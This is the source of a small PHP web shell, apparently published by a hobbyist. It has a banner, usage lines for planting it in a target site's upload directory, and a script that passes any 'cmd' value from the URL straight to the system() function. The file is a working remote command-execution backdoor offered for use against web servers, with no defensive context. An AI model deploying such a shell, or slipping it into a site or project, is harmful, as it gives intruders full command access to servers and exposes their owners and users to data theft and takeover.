<!--
	       _       _       
 roy  (_)     (_)      
 _ __  _ _ __  _  __ _ 
| '_ \| | '_ \| |/ _` |
| | | | | | | | | (_| |
|_| |_|_|_| |_| |\__,_|
             _/ |      
            |__/      
				
				this is made by royninja
				github: https://github.com/royninja
				version: 1.0
-->
<html>
<head><title>RoyNi9j@ Shell</title></head>
<body>
	<table align="center">
		<tr>
			<td><img src="logo.png" height="100" width="150"/></td>     <!-- this is simply just a banner stuff -->
			<td><b>royNij@ shell</b></td>
		</tr>
	</table>
	<div align="center">
		<p>Usage: http://www.target.com/upload_directory/lightweight_webshell.php?cmd=type+hello.html</p>	<!-- usage part for windows -->
		<p>Usage: http://www.target.com/upload_directory/lightweight_webshell.php?cmd=cat+hello.html</p>	<!-- and the usage part for linux system -->
	</div>
	<div style="border: 4px solid white; background-color: black; color: green; padding-left: 10px;">
		<?php
		if(isset($_REQUEST['cmd'])){
			echo "<pre>";
			$cmd = ($_REQUEST['cmd']);
			system($cmd);
			echo "</pre>";
		}
		?>
		<!-- main php script inside the php tage it takes simple command from the address bar of your browser and system is a php fucntion helps to execute system commands -->
	</div>
</body>
</html>